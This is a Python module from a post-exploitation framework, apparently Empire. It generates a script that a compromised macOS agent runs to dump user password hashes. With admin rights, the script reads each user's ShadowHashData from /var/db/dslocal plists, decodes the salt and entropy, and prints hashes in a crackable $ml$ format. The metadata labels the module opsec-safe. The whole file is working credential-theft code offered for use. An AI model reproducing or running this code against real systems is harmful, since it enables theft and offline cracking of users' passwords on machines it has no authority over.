from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Hashdump',

            # list of one or more authors for the module
            'Author': ['@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ("Extracts found user hashes out of /var/db/dslocal/nodes/Default/users/*.plist"),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "http://apple.stackexchange.com/questions/186893/os-x-10-9-where-are-password-hashes-stored"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
import os
import base64
def getUserHash(userName):
    from xml.etree import ElementTree
    try:
        raw = os.popen('sudo defaults read /var/db/dslocal/nodes/Default/users/%s.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null' %(userName)).read()

        if len(raw) > 100:

            root = ElementTree.fromstring(raw)
            children = root[0][1].getchildren()

            entropy64 = ''.join(children[1].text.split())
            iterations = children[3].text
            salt64 = ''.join(children[5].text.split())

            entropyRaw = base64.b64decode(entropy64)
            entropyHex = entropyRaw.encode("hex")

            saltRaw = base64.b64decode(salt64)
            saltHex = saltRaw.encode("hex")

            return (userName, "$ml$%s$%s$%s" %(iterations, saltHex, entropyHex))

    except Exception as e:
        print "getUserHash() exception: %s" %(e)
        pass


userNames = [ plist.split(".")[0] for plist in os.listdir('/var/db/dslocal/nodes/Default/users/') if not plist.startswith('_')]

userHashes = []
for userName in userNames:
    userHash = getUserHash(userName)
    if(userHash):
        userHashes.append(getUserHash(userName))

print userHashes
"""

        return script
